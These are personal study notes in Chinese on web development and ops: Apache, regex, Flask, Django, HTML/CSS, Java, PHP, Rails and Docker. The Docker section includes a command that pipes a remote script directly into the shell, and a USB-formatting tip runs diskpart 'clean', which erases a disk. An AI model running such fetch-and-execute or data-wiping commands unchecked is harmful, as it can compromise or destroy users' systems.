- `/etc/apache2/conf-available/` ， `/etc/apache2/conf-enabled/` ：这些目录与`sites-available`和`sites-enabled` `sites-available`目录具有相同的关系，但用于存储不属于虚拟主机。 `conf-available`目录中的文件可以使用`a2enconf`命令启用，并使用`a2enconf`命令禁用。
- `/etc/apache2/mods-available/` ， `/etc/apache2/mods-enabled/` ：这些目录分别包含可用和启用的模块。 以`.load`结尾的文件包含用于加载特定模块的片段，而以`.conf`结尾的文件包含这些模块的配置。 可以使用`a2enmod`和`a2dismod`命令启用和禁用模块。

### 服务器日志

- `/var/log/apache2/access.log` ：默认情况下，除非Apache配置为其他方式，否则对Web服务器的每个请求都会记录在此日志文件中。
- `/var/log/apache2/error.log` ：默认情况下，所有错误都记录在此文件中。 Apache配置中的`LogLevel`指令指定错误日志将包含多少细节。

[配 ssl 证书](<https://www.alibabacloud.com/help/zh/doc-detail/102450.htm>)



## Regular Expression

```shell
# 入门
# \b 匹配单词的开头或结尾
# 如果要查找 hi 这个单词，表达为 \bhi\b
\bhi\b.*\bLucy\b  
# . 表示除换行符以外的任意字符
# * 代表数量，它指定 * 前边的内容可以重复使用任意次
# 和起来  =>  匹配 hi ... Lucy 
0\d\d-\d\d\d\d\d\d\d\d  # \d 表示一位数字， - 为连字符，只匹配本身
# 简化一下  =>  0\d{2}-\d{8}
# \s 匹配任意的空白字符
# \w 匹配字母或数字或下划线或汉字等
\ba\w*\b  # 表示匹配任意长度以 a 开头的单词
\d+  # 匹配 1 个或多个连续的数字，+ 和 * 类似，不过 + 是至少一次
\b\w{6}\b  # 匹配长度恰好为 6 的单词
# ^ 匹配字符串的开始
# $ 匹配字符串的结束
^\d{5,12}$  # 表示整个字符串只能是 5~12 位数字

# 元字符
. 		除换行符以外的任意字符
\w 		字母或数字或下划线或汉字
\s 		任意的空白符
\d 		数字
\b 		单词的开始或结束
^ 		字符串的开始
$ 		字符串的结束

# 字符转义  =>  \

# 重复
* 		任意次
+ 		至少 1 次
? 		0 次或 1 次
{n} 	重复 n 次
{n,} 	至少 n 次
{n,m} 	n ~ m 次


# 字符类
如果想匹配没有预定义元字符的字符集合
比如元音字母 a, e, i, o, u  =>  [aeiou]
比如匹配一些标点符号 . ? !  =>  [.?!]
还可以轻松地指定一个字符范围
比如 [0-9] == \d ,含义与 \d 是完全一致的，还有 [a-z0-9A-Z] == \w
\(?0\d{2}[)-]?\d{8})  =>  (010)88886666 / 022-22334455 / 02912345678

# 分枝条件
不幸的是，上面那个表达式也能匹配到 010)12345678 / (022-87654321 这种格式，此时就要用到分枝条件
分枝条件指的是有几种规则，如果满足其中任意一种规则都应该当成匹配，用 | 进行分隔
0\d{2}-\d{8}|0\d{3}-d{7}  # 注意分隔符，此时就能匹配两种格式的号码了，3 + 8 / 4 + 7
\(0\d{2}\)[-]?\d{8}|0\d{2}[-]?\d{8}  # 匹配 (0xx) - xx.. / (xxx) xx.. / 0xx-xx.. / ..
\d{5}-\d{4}|\d{5}  # xxxxx-xxx | xxxxx
# 使用分枝条件时还要注意各个条件的顺序
比如 \d{5}|\d{5}-\d{4} ，它只会匹配5位的邮编(以及9位邮编的前5位)
匹配分枝条件时，将会从左到右地测试每个条件，如果满足了某个分枝的话，就不会去再管其他条件

# 分组
重复单个字符很方便，那么重复一个字符串呢？就可以用小括号进行分组了，也叫做子表达式
(\d{1,3}\.){3}d{1,3}  # 简单的IP地址匹配  1.1.1.1
然而上面的表达式也可能出现 256.300.888.999，正则表达式又不提供任何数学计算
只能这样用：((2[0-4]\d|25[0-5]|[01]?\d\d?)\.){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)
(?<name>exp)  # 命名

# 反义
\W 			任意不是字母，数字，下划线，汉字的字符
\S			任意非空白符的字符
\D			任意非数字的字符
\B			不是单词开头或结束的位置
[^x]		非x的任意字符
[^aeiou]	非aeiou的任意字符
如：\S+   不包含空白符的字符串
<a[^>]+> 用尖括号括起来的以a开头的字符串

# 后向引用

# 零宽断言

# 负向零宽断言

# 注释
(?#注释) 直接加到exp后面

# 贪婪与懒惰
默认贪婪状态
*?	   		重复任意次，但尽可能少重复
+?			重复1次或更多次，但尽可能少重复
??			重复0次或1次，但尽可能少重复
{n,m}?		重复n到m次，但尽可能少重复
{n,}?		重复n次以上，但尽可能少重复


# 处理选项

# 平衡组/递归匹配


# php的正则
preg_match() / preg_match_all()
用来做包围的字符不能出现在re中，否则会出现矛盾，将报错
可以用以下符号包围正则参数
`~!@#$%^&*-+/
```

[继续学习](https://deerchao.net/tutorials/regex/regex.htm)

+   py re

```python
re.search(pattern, )
```

## Flask

坑点：pycharm 中需手动开启debug模式，右上角 edit configuration

**配置虚拟环境**

```shell
# pip install virtualenv
# 直接用 conda 带的虚拟环境，不需要另外安装上面的，另外，py 3.4 以上自带了虚拟环境
```

**Start**

```python
# 初始化一个Flask对象
# __name__ 方便flask寻找资源，方便插件寻找问题
app = Flask(__name__)
app.run(debug=True)  # 设置debug模式
```

```python
# 重定向
from flask import redirect, url_for
# url 反转，即利用视图函数得出 url，将 url 传入 redirect() 即可
redirect('')

# 使用模板
/templates 下创建文件
context = {}
return render_template('file_name', **context)
{{...}} 中写入后端传来的参数
# 模板的继承
{% extends "base.html" %}
```



## Django

### 创建项目：

```shell
django-admin startproject project_name
```

### 目录解释：

```shell
│manage.py					# 命令行工具，可以用多种方式对Django项目进行交互
│
└─djtest					
        settings.py			# 项目的配置文件
        urls.py				# 项目的URL声明
        wsgi.py				# 项目与WSGI兼容的服务器入口
        __init__.py			# 空文件，它告诉Python这个目录应该被看做一个Python包
```

### 基本操作：

+ 设计表结构

## HTML

`HTML`不是一种编程语言，而是一种标记语言。

除了某些单标签，其他都是成对出现的。

语法骨架:

```html
<!DOCTYPE html>							// 声明为HTML5文档，有助于浏览器正确显示网页
<html>
    <head>
        <meta charset="utf-8">          // 定义网页编码格式为 utf-8
        <title>这是一个骨架哟</title>
    </head>
    <body>								// 包含了可见的页面内容
        <h1>我的第一个标题</h1>
        <h2>这是一个标题</h2>
		<h3>这是一个标题</h3>
        <p>我的第一个段落</p>
    </body>
</html>
```

### 常用标签

```html
<span></span> 为文字设置单独样式
<q></q> 短文本引用
<blockquote></blockquote> 长文本引用
<br> 换行
&nbsp; 空格
<hr> 水平横线
<address></address> 地址信息
<code></code> 插入代码
<pre></pre> 插入大段代码（保留原格式）
<ul>
    <li>信息1</li>  新闻信息列表（无序）
    <li>信息2</li>
</ul>
<ol>
    <li>信息1</li> 销售排行榜（有序）
    <li>信息2</li>
</ol>
<div id=""></div> 
<table>
    <tr>
        <th>姓名</th>
        <th>年龄</th>
        <th>性别</th>
    </tr>
</table>
```



### 表单与PHP交互

GET：显示在地址栏，长度有限制，可以资源定位。格式 ? what=flag

POST：不会显示在地址栏，可用来提交密码

下列三种按钮皆可在点击时触发表单的submit事件：[原文](http://caibaojian.com/form.html)

```
<input type="submit" />
<button type="submit"></button>
<input type="image" />
```

## CSS

### 基本语法

```css
selector {
    property:value;
}
h1 {
    color:red;	/*属性值与单位之间不能留有空格*/
    font-size:14px;
}
/*如果值大于1个单词时，则需要加上引号：*/
p {font-family:"sans serif"}

/*外部样式*/
<head><link rel="stylesheet" type="text/css" href="mystyle.css"></head>

/*内部样式*/
<head>
    <style>
        hr {color:sienna;}
        p {margin-left:20px;}
        body {background-image:url("images/back40.gif");}
    </style>
</head>

/*内联样式：单独针对某个元素设置下属性*/
<p style="color:sienna;margin-left:20px">这是一个段落。</p>

/*多重样式:*/
如果某些属性在不同的样式表中被同样的选择器定义，属性值将从更具体的样式表中被继承过来。
h3 {  // 外部css
    color:red;
    text-align:left;
    font-size:8pt;
}
h3 {  // 内部css
    text-align:right;
    font-size:20pt;
}
/* 最终效果
* color:red;
* text-align:right;
* font-size:20pt;
*/

/*优先级：*/
内联样式 > 内部样式 > 外部样式 > 浏览器默认样式
注意：如果外部样式放在内部样式的后面，则外部样式将覆盖内部样式

/*背景*/
body {
    background-color:#b0c4de;  			// 设置元素的背景颜色
    background-image:url('paper.gif');  // 把图像设置为背景
    background-repeat:repeat-x;  		// 设置背景图像是否及如何重复
    background-attachment  				// 背景图像固定或滚动
    background-position:right top;  	// 设置背景图像的起始位置
}
body {background:#ffffff url('img_tree.png') no-repeat;}  // 直接 background 简写属性

/*文本格式*/
文本颜色
body {color:red;}
h1,h2,h3 {color:#00ff00;}  // 多个标签用同一个属性
h2 {color:rgb(255,0,0);}
文本对齐方式
h1 {text-align:center;}
p.date {text-align:right;}
p.main {text-align:justify;}  // 每一行被展开为宽度相等，左，右外边距是对齐（如杂志，报纸）
文本装饰：删除链接的下划线
h1 {text-decoration:overline;}		// 上划线
h2 {text-decoration:line-through;}  // 中划线
h3 {text-decoration:underline;}		// 下划线
文本转换：大小写
p.uppercase {text-transform:uppercase;}
p.lowercase {text-transform:lowercase;}
p.capitalize {text-transform:capitalize;}
文本缩进：文本的第一行的缩进
p {text-indent:50px;}

/*字体*/
设置文本的字体系列，应该多设置几个字体名称，如果浏览器不支持第一种字体，他将尝试下一种字体
p{font-family:"Times New Roman", Times, serif;}  
字体样式
p.normal {font-style:normal;}
p.italic {font-style:italic;}
p.oblique {font-style:oblique;}
字体大小
h1 {font-size:40px;}
h2 {font-size:30px;}
p {font-size:14px;}
为了避免Internet Explorer 中无法调整文本的问题，许多开发者使用 em 单位代替像素 1em = 16px
把段落设置为小型大写字母字体
p {font-variant:small-caps;}
字体粗细
p.normal {font-weight:normal;}
p.thick {font-weight:bold;}
p.thicker {font-weight:900;}

/*链接*/
a:link {color:#000000;}      	// 未访问链接
a:visited {color:#00FF00;}  	// 已访问链接
a:hover {color:#FF00FF;}  		// 鼠标移动到链接上
a:active {color:#0000FF;}  		// 鼠标点击时
高级玩法：方框显示
a:link,a:visited {
	display:block;
	font-weight:bold;
	color:#FFFFFF;
	background-color:#98bf21;
	width:120px;
	text-align:center;
	padding:4px;
	text-decoration:none;
}
a:hover,a:active {background-color:#7A991A;}

/*列表*/
列表项标记样式
ul.a {list-style-type: circle;}
ul.b {list-style-type: square;}
ol.c {list-style-type: upper-roman;}
ol.d {list-style-type: lower-alpha;}
标记的背景图像
ul {list-style-image: url('sqpurple.gif');}
简写
ul {list-style: square url("sqpurple.gif");}
位置
ul {list-style-position: inside;}

/*表格*/

/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
/**/
```



### 派生选择器

依据元素在其位置的上下文关系来定义样式，可以使标记更加简洁

### id 选择器

```css
<div id="idd"> 这是一个div </div>
#idd {proprety:value;}
```



### 类选择器

### 属性选择器

```css
[属性=值] {}
```

## JavaScript

## Ajax

### \$.get()

### \$.post()

### \$.ajax()

## XML

### 概念

### 语法

### 约束模式

## Java

```java
// 数据类型
boolean	byte char double float int long	short

// 变量类型
public class Variable{
	static int a = 0;  // 类变量，独立于方法之外的变量，用 static 修饰。
	String str = "hello world";  // 实例变量，独立于方法之外的变量，不过没有 static 修饰
    public void method() {
    	int tt = 0;  // 局部变量
    }
}
// 上面给出了静态变量，现在看看静态方法。static 关键词用来声明独立于对象的静态方法。静态方法不能使用类的非静态变量。静态方法从参数列表得到数据，然后计算这些数据。

// 修饰符
default(啥也不写)
public private protected

// 基本语法
final double PI = 3.14;  // 常量表示
int[] scores = new int[5];
int[] scores = new int[]{1, 2, 3};  // 此时不能指定长度
int[][] scores = new int[3][];
for (int s : scores) {}
// 可以使用 Arrays 类操作数组

```



## PHP

- (1) 熟悉HTML/CSS/JS等网页基本元素，完成阶段可自行制作简单的网页，对元素属性相对熟悉。

- (2) 理解动态语言的概念和运做机制，熟悉基本的PHP语法。

- (3) 学习如何将PHP与HTML结合起来，完成简单的动态页面。

- (4) 接触学习MySQL，开始设计数据库。

- (5) 不断巩固PHP语法，熟悉大部分的PHP常用函数，理解面向对象编程、MySQL优化，以及一些模板框架。

- (6) 最终完成一个功能齐全的动态站点。

  ---

- 新手不要看到上面的概括就以为PHP学习是很简单的，编程是需要你认真的思考和不断的实践。下面具体解释一下PHP的学习线路。首先，任何网站都是由网页组成的，也就是说想完成一个网站，必须先学会做网页，掌握静态网页的制作技术是学习开发网站的先决条件。因此我们要学习HTML，为今后制作网站打下基础。学习HTML应该边学边做，HTML中的任何元素都要亲自实践，只有明白了什么元素会起到什么效果之后，才能深刻记忆，一味的看书是不行的。
- 假设你已经可以完成一个静态页面了，那么就该开始了解动态语言，刚一接触动态语言，可能很多人都会有很多不解，代码不是作为直接输出的，而是要经过处理的，HTML是经过HTML解析器，而PHP也要通过PHP解析器，跟学习HTML一样的道理，想让任何的解析器工作，就必须使用它专用的语法结构。
- 学习PHP，你应该感到幸运，因为如果你学过其他语言，你就会发现PHP还是相对简单的，这一阶段，你要搞清楚HTML和PHP的概念，你现在完全可以让PHP给你算算一加一等于几，然后在浏览器输出。不要觉得幼稚，这虽然是很小的一段代码，但是对于你的编程之路，可是迈出了一大步。不过现在，你还是一个菜鸟。
- 接下来就要学习数据库了，MySQL可以说是PHP的黄金搭档，我们要征服这个数据库，在你理解了数据库的概念之后，就要尝试通过PHP来连接数据库，进而会用PHP成功的插入，删除和更新数据。
- 这个时候，你可能会处于这种状态：你会HTML吗？会，我能编好几个表格排板的网页呢！你会PHP吗？会，我会把一加一的运算写在函数里，然后调用！你会MySQL吗？会，我可以把数据库里的数据插入删除啦！
- 那接下来该做什么呢？尝试着做个小的留言本吧，这同样是新手面临的一道关卡。花了一段时间，你终于学会把表单的数据插入数据库，然后显示出来了，应该说一个程序的雏形已经诞生了。但是，你可能会看人家这个编论坛，那个开发CMS，我什么时候可以写一个呢？不要急，再巩固一下知识，熟悉了PHP和MySQL开发的要领后，再回头看你写的那个留言本，你也许会怀疑那真的是你写的吗？这个时候，你可以完善一下你写的留言本。留言本应该加入注册以及分页的功能，可以的话，UI也可以加强。
- 这就算学会了吗？NO，NO，NO，还早呢，你到现在还没碰过OOP呢吧？那模板和框架呢？还要继续学习呀！PHP框架提供了一个用以构建web应用的基本框架，从而简化了用PHP编写web应用程序的流程。可以节省开发时间、有助于建立更稳定的应用。所以说，PHP框架是一个可以用来节省时间并强化自己代码的工具。当你第一次选择PHP框架时，建议多尝试几个，每个框架都有自己的长处和短处，例如Zend框架由于多样的功能、并且有一个广泛的支持系统，流行了很长时间。而CakePHP是一个晚于Zend的PHP框架，相应的支持系统也比较少，但是更为方便和易于使用。
- 了解了面向对象和框架后，你应该接触一下XML了，总而言之，你绝对不会发现你全部都学会了，学无止境！学东西，永远不要妄想有速成这一说，技巧再多，但是缺少努力，那也是白搭。有一点可以保证，就是你学会了PHP，那么再学其它语言，肯定速成，反过来也一样，如果你之前学过其它的语言，那么学PHP肯定快。
- 多借鉴别人成功的代码，绝对是有益无害，所以要多看那些经过千锤百炼凝出来的经典代码，是进步的最好方法。另外，要强调的是，学习一项技术过程中可能会遇到困难，可能会迷茫，你也许学了一半的PHP，又开始打C#的主意，或者有人说Java很好，这个时候你绝对不能动摇，要坚持到底，彻底学会。祝你顺利学成PHP，开发自己想要的网站。

```php
解决中文输出乱码：
    <?php  
	header("Content-type:text/html;charset=utf-8");  
	?>

// 这就是PHP的标识
	<?php echo "This is PHP that can be run on Server"; ?>
                
// 字符串
需要用 " ", ' ', Heredoc?都可以...
" "中出现变量的时候，变量会自动和双引号的内容连在一起
$a .= $b   // 将b字符串加到a右边
当字符串很长的时候，使用Heredoc结构
    <?php 
    $string1 = <<<GOD
    我有一只小毛驴，我从来也不骑。
    有一天我心血来潮，骑着去赶集。
    我手里拿着小皮鞭，我心里正得意。
    不知怎么哗啦啦啦啦，我摔了一身泥.
    GOD;
    echo $string1;
	?>

直接输出长字符串        
    <?php
     echo <<<EOF		// 这个EOF可以任意命名，与结尾处相同即可
     	<h1>哈哈哈哈</h1>
        <p>这是标题</p>
    EOF;
	// 结束需要独立一行且前后不能空格   
	?>
     
<?php echo 12*3; ?>
<?php echo "Hello, " . "PHP!"; ?>
    
// 变量
$var = "This is a avarible"

var_dump($var)  // 可输出变量类型
 
// 特殊类型——资源
资源是由专门的函数来建立和使用的，例如打开文件、数据连接、图形画布。我们可以对资源进行操作（创建、使用和释放）。任何资源再不需要的时候应该被及时释放。如果我们忘记释放资源，系统自动启动垃圾回收机制，在页面执行完毕后回收资源，以免内存被消耗殆尽。
<?php
//首先采用“fopen”函数打开文件，得到返回值的就是资源类型。
$file_handle = fopen("D:\\i.txt", "r");
if ($file_handle){
    //接着采用while循环一行行地读取文件，然后输出每行的文字
    while (!feof($file_handle)) { //判断是否到最后一行
        $line = fgets($file_handle); //读取一行文本
        echo $line; //输出一行文本
        echo "<br />"; //换行
    }
}
fclose($file_handle);//关闭文件
?>
    
// 特殊类型——NULL
NULL是空类型，对大小写不敏感，NULL类型只有一个取值，表示一个变量没有值，当被赋值为NULL，或者尚未被赋值时，或者被unset()，在这三种情况下变量被认为是NULL。
    
// 常量
自定义常量
bool define(string $constant_name, mixed$value[, $case_sensitive = true])// 大小写敏感
define("PI",3.14);
$p = "PII";
define($p,3.14);

系统常量
系统常量是PHP已经定义好的常量，我们直接拿来使用
__FILE__:PHP程序文件名。它可以帮助我们获取当前文件在服务器的物理位置。
__LINE__:PHP程序文件行数。它可以告诉我们，当前代码在第几行。
__DIR__:文件所在目录
PHP_VERSOIN:当前解析器的版本号。
PHP_OS:执行当前PHP版本的操作系统名称。

// 如何获得常量的值呢？
    1.直接使用常量名，如 PI、PII
    2.使用constant()函数，如 constant("PI")
    
// 如何判定常量是否被定义？
    使用defined()函数，其返回值为bool。如 defined(PI)
    
// 引用
$b = $a;
$c = &$a;	// c为a的引用，两变量共享一块内存

// 比较运算符
	==				等于则TRUE
    !=  <>			不等则TRUE
    ===				相等且类型相同才TRUE
    !==				非全等，不相等或类型不同则TRUE
     <		>		<= 		>=
    
// 三元运算符与c同
	$a = 78;
	$b = $a >= 60 ? "及格" : "不及格"；
        
// 逻辑运算符
     and	or    xor    !	 &&	   ||
        
// 错误控制运算符——“@”
对于一些可能会在运行过程中出错的表达式，我们不希望出错的时候给用户显示这些错误信息。
于是，可以将@放置在一个PHP表达式之前，该表达式的坑产生的任何错误信息都被忽略掉
<?php
	header("Content-type:text/html;charset=utf-8");
    $conn = @mysqli_connect("localhost", "username", "passwd");
    echo "出错了，错误信息是：" . $php_errormsg;
?>
    
$num = rand(1,50); // 获取1至50的随机数

// foreach()
foreach(数组 as 值)	foreach(数组 as 下标 => 值)
<?php
header("Content-type:text/html;charset=utf-8");
$students = array(
    '2010'=>'令狐冲',
    '2011'=>'林平之',
    '2012'=>'曲洋',
    '2013'=>'任盈盈',
);

foreach ($students as $v){
    echo $v;//输出（打印）姓名
    echo "<br />";
}

foreach ($students as $key => $v){
    echo $key . $v;
    echo "<br />";
}
?>
   
// 数组
    1.数值数组-带有数字 ID 键的数组
    $cars = array("Volvo","BMW","Toyota");  // 自动分配 ID 键（0开始）
	获取数组长度——count($cars)
        
    2.关联数组-带有指定的键的数组，每个键关联一个值（dict）
    $age=array("Peter"=>"35","Ben"=>"37","Joe"=>"43");

    3.多维数组-包含一个或多个数组的数组
    
// 函数
function functionName($arg1, $arg2){return;}
```

### 杂项

```php
ini_set("display_error", True);  // 为 php.ini 中的选项值设置初始值
ini_get('display_error');        // 取值
exit(status)  // 输出一条消息，并退出当前脚本，与下同
die(status)   // exit() 的别名，若status为字符串，则该函数会在退出前输出字符串，若为整数，这个值将会做退出状态。0为正常终止。
eval(phpcode)  // 把字符串作为PHP代码运行
trim(string(,char))  // 移除字符串两侧的空白字符或指定字符
addslashes(string)  // 为string中的 ',",\,NULL添加'\'
is_string($var)  // 检测变量是否为字符串
strval(mixed $var)  // 返回var的字符串
strrev(str)  // 反转字符串
var_dump(var)  // 打印变量的相关信息
show_source()  // 对文件进行语法高亮显示
$a = @$_REQUEST['hello'];  // 抑制报错信息的显示
```

## Ruby on rails

Rails框架的主要结构是MVC(Model-View-Controller)

`MVC`的几点理解：

1. *MVC*最重要的是模型*Model*，业务逻辑写在*Model*里

2. 控制器*Controller*里面越少越好，业务逻辑不要写在控制器里

3. *View*是可以看到的东西


`MVC`的终极目标：

> 将软件用户界面和业务逻辑分离，以使代码可扩展性，可复用性，可维护性，灵活性加强



现实中的 *Web* 应用：

1. *Model* 层是数据库访问层
2. *View* 层是 *web* 展示的样子
3. *Controller* 层写的是业务逻辑



***scaffold*生成*User*数据模型**

```shell
$ rails generate scaffold User name:string email:string
```

**撤销generate操作**

```shell
$ rails generate controller StaticPages home help
$ rails destroy  controller StaticPages home help
```

**迁移数据库**——使用新的数据模型更新数据库

```shell
rails db:migrate
```

**撤销迁移**

```shell
$ rails db:rollback
```

**回滚到最初状态**

```shell
$ rails db:migrate VERSION=0  # 最后一个数字为版本号
```

**撤销generate操作**

```shell
$ rails generate controller StaticPages home help
$ rails destroy  controller StaticPages home help
```



**常用命令**

| 完整形式           | 简写形式    |
| ------------------ | ----------- |
| `$ rails server`   | `$ rails s` |
| `$ rails console`  | `$ rails c` |
| `$ rails generate` | `$ rails g` |
| `$ rails test`     | `$ rails t` |
| `$ bundle install` | `$ bundle`  |





## 开发中的小问题

+   U 盘格式化

    ```shell
    diskpart
    lis dis
    sel dis ID
    clean
    create partition primary
    active
    format fs=fat32 quick
    ```


+   sudo echo > 权限不够

    >   ➜  ~ sudo echo '<h1>Hello, Docker!</h1>'  > /var/www/html/test.html
    >   zsh: permission denied: /var/www/html/test.html

    ```shell
    原因：sudo只是让echo命令具有root权限，> 没有
    # sh -c 将字符串作为完整命令来执行
    sudo sh -c "echo >"
    
    # 利用管道和tee命令，该命令可从标准输入中读入信息并将其写入标准输出或文件中
    echo '<h1>Hello, Docker!</h1>' | sudo tee /test.html
    echo '<h1>Hello, Docker!</h1>' | sudo tee -a /test.html  # -a 为追加
    ```


+   .swp 文件恢复

```shell
假设你的swp文件叫'.m.php.swp'
可用带-r参数编辑
#vi -r m.php
然后wq保存即可

或者使用:
#vi  .m.php.swp
然后:recover
最后wq保存
```

-   VM 共享文件夹

>   常规操作后，/mnt 目录下无 hgfs 文件夹，暂时没有解决：
>
>   -   在 kali 上 open-tools 之类的都显示定位失败
>   -   直接挂载还是啥都没有

**解决办法：**重装vm-tools，一路回车，不用管

### PHP 中文输出乱码

```php
一、HTML页面编码设置 
1.在head标签里面加入这句
<head>  
	<metahttp-equiv="Content-Type"content="text/html; charset=UTF-8"/>  
</head> 

    
2.文件保存时设置编码UTF-8
    
二、PHP编码设置 
在方法一的基础上在php代码时最前面即第一句写上
<?php  
	header("Content-type:text/html;charset=utf-8");  
?>

三、Mysql编码设置 
在前面的基础上，还要在你的数据查询/修改/增加之前加入数据库编码。
<?php  
	mysql_query('SET NAMES UTF8');     
?>
```




### rails new lmzdx -d mysql* 报错

```shell
An error occurred while installing mysql2 (0.5.2), and Bundler cannot
continue.
Make sure that `gem install mysql2 -v '0.5.2' --source 'https://rubygems.org/'`
succeeds before bundling.

In Gemfile:
  mysql2
         run  bundle exec spring binstub --all
bundler: command not found: spring
Install missing gem executables with `bundle install`
```

**Solution**

```shell
I think you missing dev library of mysql:
On ubuntu:
$ sudo apt-get install libmysqlclient-dev

On Red Hat/CentOS and other distributions using yum:
$ sudo yum install mysql-devel

On Mac OS X with Homebrew:
$ brew install mysql
```



**rails 新项目后运行cap install STAGES=production 报错**

```shell
显示cap没有安装
此时不要听Ubuntu的建议去使用apt安装
重启终端即可
```



### *TZInfo::DataSourceNotFound: tzinfo-data is not present.*

```shell
01 rake aborted!
01 TZInfo::DataSourceNotFound: tzinfo-data is not present. 
```

**Solution**

```shell
run gem install tzinfo-data 
or add gem 'tzinfo-data' to your Gemfile and run bundle install
直接gem安装可能会报错，说什么找不到，此时可以先 bundle update && bundle install
最重要的一步来了 git push
服务器是直接去GitHub上取代码，如果不同步给GitHub，仍然会报老错误
```



### nginx 配置 /etc/nginx/sites-enabled/default 时挂掉 

```shell
如果备份文件与配置文件就放在同一目录时，备份文件需要以.开头，
否则会与配置文件冲突，导致nginx挂掉（并非以文件名来识别）
```



### capistrano 信息

```c++
================= Release notes for capistrano-passenger ===========================
passenger once had only one way to restart: `touch tmp/restart.txt`
Beginning with passenger v4.0.33, a new way was introduced: `passenger-config restart-app`

The new way to restart was not initially practical for everyone,
since for versions of passenger prior to v5.0.10,
it required your deployment user to have sudo access for some server configurations.

capistrano-passenger gives you the flexibility to choose your restart approach, or to rely on reasonable defaults.

If you want to restart using `touch tmp/restart.txt`, add this to your config/deploy.rb:

    set :passenger_restart_with_touch, true

If you want to restart using `passenger-config restart-app`, add this to your config/deploy.rb:

    set :passenger_restart_with_touch, false # Note that `nil` is NOT the same as `false` here

If you don't set `:passenger_restart_with_touch`, capistrano-passenger will check what version of passenger you are running
and use `passenger-config restart-app` if it is available in that version.

If you are running passenger in standalone mode, it is possible for you to put passenger in your
Gemfile and rely on capistrano-bundler to install it with the rest of your bundle.
If you are installing passenger during your deployment AND you want to restart using `passenger-config restart-app`,
you need to set `:passenger_in_gemfile` to `true` in your `config/deploy.rb`.
====================================================================================
```



## Docker

#### 基本概念

一个 **Docker Registry** 中可以包含多个 **仓库（Repository）**；

每个仓库可以包含多个**标签（Tag）**；每个标签对应一个镜像。

`镜像`和`容器`的关系，就像`类`与`对象`

#### 安装

```shell
# 更新相关软件
sudo apt update
sudo apt install apt-transport-https ca-certificates curl software-properties-common

# 添加Docker源
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable"

sudo apt update
apt-cache policy docker-ce
# 下面是安装信息：
docker-ce:
  Installed: (none)
  Candidate: 18.06.1~ce~3-0~ubuntu
  Version table:
     18.06.1~ce~3-0~ubuntu 500
        500 https://download.docker.com/linux/ubuntu bionic/stable amd64 Packages
     18.06.0~ce~3-0~ubuntu 500
        500 https://download.docker.com/linux/ubuntu bionic/stable amd64 Packages
     18.03.1~ce~3-0~ubuntu 500
        500 https://download.docker.com/linux/ubuntu bionic/stable amd64 Packages
        
# 正式安装
sudo apt install docker-ce

# 查看运行状态
sudo systemctl status docker
```

**基本使用**

```shell
# Dockerfile 构建镜像
docker build -t "name" .  # 注意 .

# 启动交互式容器 -i：交互式操作，-t 终端
docker run -i -t IMAGE /bin/bash 

docker inspect NAME  # 查看详细信息？
docker run --name=xxx -it IMAGE /bin/bash  # 以xxx为名字运行
# CTRL + p + q   =>  退出并后台运行
docker attach 容器名  # 恢复到后台容器，更建议使用 docker exec？

# 查看守护进程
ps -ef | grep docker
sudo status docker

docker top 
docker exec [-d][-i][-t] nginx  # 为运行中的容器启动新进程
docker logs 
docker images	#列出本地镜像
docker start CONTAINER 	#启动一个或多少已经被停止的容器
docker stop / kill CONTAINER 	#停止一个运行中的容器
docker restart CONTAINER	 #重启容器
docker rm CONTAINER #删除容器  -f 强制删除
docker rmi IMAGE #删除镜像
docker rmi $(docker images -q ubuntu)  # 删除Ubuntu所有镜像
docker stop $(docker container ls -q)  # 停止所有正运行的容器

sudo systemctl daemon-reload #reload daemon.json
sudo systemctl restart docker #重启docker

# 查看镜像、容器、数据卷所占空间
docker system df

docker info  # 查看信息
docker diff 容器名 # 查看改动信息

# 端口映射
docker run -p 80 -it 		# -i 标准输入保持打开
docker run -p 8080:80 -it 	# -t 为docker分配一个伪终端(pseudo-tty)，并绑定到容器的标准输入
docker run -p 0.0.0.0:80 -it 

# 查看端口映射情况
docker port docker_name

# 容器快照？
# 导出容器
docker export ID > ubuntu.zip
# 导入容器
cat ubuntu.zip | docker import - test/ubuntu:v1.0
# 通过URL导入
docker import http://xxx example/imagesrepo
# 数据卷
docker volume create xxx
docker run -it -v ~/datavolume:/data:ro ubuntu /bin/bash  # ro设置只读权限
# 数据卷容器
docker run -it --name dv --volumes-from dvt4 ubuntu /bin/bash


# 复制文件到容器中
docker cp xxx id:/dir
docker cp ./test apache:/var/www/
docker exec -it apache


# 清理资源
docker container prune
docker image prune
```

Nginx 部署流程

```shell
# 创建映射80端口的交互式容器
docker run -p 8080:80 --name web -it ubuntu /bin/bash
# 安装Nginx
apt update
apt install - y nginx
# 安装文本编辑器 vim
apt install -y vim
# 创建静态页面
cd /var/www/html
touch index.html
echo '<h1>Hello, Docker!</h1>' > index.html
# 修改Nginx配置文件
whereis nginx  # 找到安装目录
vim /etc/nginx/sites-enabled/default  # 修改 root 目录
# 运行Nginx
nginx
# 验证网站访问
curl IP:port  # ip 可用宿主机的IP加映射端口，也可以用 docker inspect web 查看真实容器IP

# 停止容器
docker stop web

# 启动
docker start -i web  # 此时会发现，nginx已经停止
docker exec web nginx 
# 如果之前没有指定端口时，重新启动时 port 将发生变化
```

Docker也遵守Linux命令的格式

```shell
docker [option] [command] [arguments]
```

```shell
docker search ubuntu  	# 查找镜像
docker pull name		# 下载image
docker push 			# 推送镜像
```

#### 构建镜像

```shell
# 通过容器构建
docker commit [选项] <容器ID或容器名> [<仓库名>[:<标签>]]
docker commit \
    --author "Tao Wang <twang2218@gmail.com>" \
    --message "修改了默认网页" \
    webserver \
    nginx:v2
# ！慎用 docker commit

# 使用dockerfile构建镜像  —— 包括一系列命令的文件，类似shell脚本？
dockerfile编写语法
# 注释

docker build   # 构建镜像
```



**配置 Docker 加速器**

```shell
curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io
sudo systemctl restart docker.service  # 重启 Docker 生效

docker info
# 包含以下信息，加速器配置成功
Registry Mirrors:
 http://f1361db2.m.daocloud.io/
```



